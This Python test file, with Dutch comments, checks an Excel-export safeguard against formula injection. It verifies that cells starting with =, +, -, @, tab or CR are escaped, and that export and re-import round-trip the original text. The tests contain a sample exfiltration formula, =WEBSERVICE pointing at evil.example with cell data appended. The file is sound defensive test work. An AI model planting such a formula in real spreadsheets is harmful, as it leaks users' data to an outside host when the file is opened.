"""Tests voor de formule-injectie-mitigatie (CISO-aandachtspunt, zie
app/xlsx_safety.py): elke cel met gebruikers-tekst die met =,+,-,@,Tab of CR
begint mag nooit als een echte Excel-formule in een exportbestand belanden."""
from __future__ import annotations

import io
import zipfile

import pytest

from app.exporter import build_data_workbook
from app.parser import parse_workbook
from app.xlsx_safety import sanitize_cell, sanitize_row
from tests.helpers import make_tree


class TestSanitizeCell:
    @pytest.mark.parametrize('trigger', ['=', '+', '-', '@', '\t', '\r'])
    def test_escaped_triggerteken_krijgt_voorloop_apostrof(self, trigger):
        assert sanitize_cell(f'{trigger}SOM(A1:A2)') == f"'{trigger}SOM(A1:A2)"

    def test_gewone_tekst_blijft_ongewijzigd(self):
        assert sanitize_cell('Gewone omschrijving') == 'Gewone omschrijving'

    def test_niet_strings_blijven_ongewijzigd(self):
        assert sanitize_cell(42) is 42 or sanitize_cell(42) == 42
        assert sanitize_cell(None) is None

    def test_sanitize_row_werkt_per_cel(self):
        assert sanitize_row(['ok', '=1+1', 3]) == ['ok', "'=1+1", 3]


def _sheet_xml(xlsx_bytes: bytes, sheet_index: int = 1) -> str:
    with zipfile.ZipFile(io.BytesIO(xlsx_bytes)) as zf:
        return zf.read(f'xl/worksheets/sheet{sheet_index}.xml').decode('utf-8')


class TestExportBevatNooitEenEchteFormule:
    def test_kwaadaardige_elementnaam_wordt_geen_formulecel(self):
        # '=' is precies het teken waarvan geverifieerd is dat openpyxl het
        # automatisch omzet naar een <f>-formuletag (zie xlsx_safety.py-
        # docstring) — dit is dus geen theoretische aanname.
        tree = make_tree()
        tree['elements'][0]['name'] = '=WEBSERVICE("http://evil.example/leak?x="&A1)'
        xlsx = build_data_workbook('nieuw', tree)

        # Geen enkel werkblad mag een <f>-tag bevatten die uit deze naam komt.
        with zipfile.ZipFile(io.BytesIO(xlsx)) as zf:
            sheet_names = [n for n in zf.namelist() if n.startswith('xl/worksheets/sheet')]
            for name in sheet_names:
                xml = zf.read(name).decode('utf-8')
                assert '<f>WEBSERVICE' not in xml, f'onverwachte formule in {name}'

    def test_roundtrip_herstelt_de_originele_naam_exact(self):
        # De export escaped ('WEBSERVICE(...)), maar een re-import via de app
        # zelf (round-trip-ontwerp, zie exporter.py) moet weer precies de
        # originele, ongewijzigde naam teruggeven — geen blijvende apostrof.
        tree = make_tree()
        original_name = '=WEBSERVICE("http://evil.example")'
        tree['elements'][0]['name'] = original_name
        xlsx = build_data_workbook('nieuw', tree)

        status, report, parsed = parse_workbook(xlsx)
        assert status == 'ok', report['warnings']
        names = {e['code']: e['name'] for e in parsed['elements']}
        assert names['OB1'] == original_name
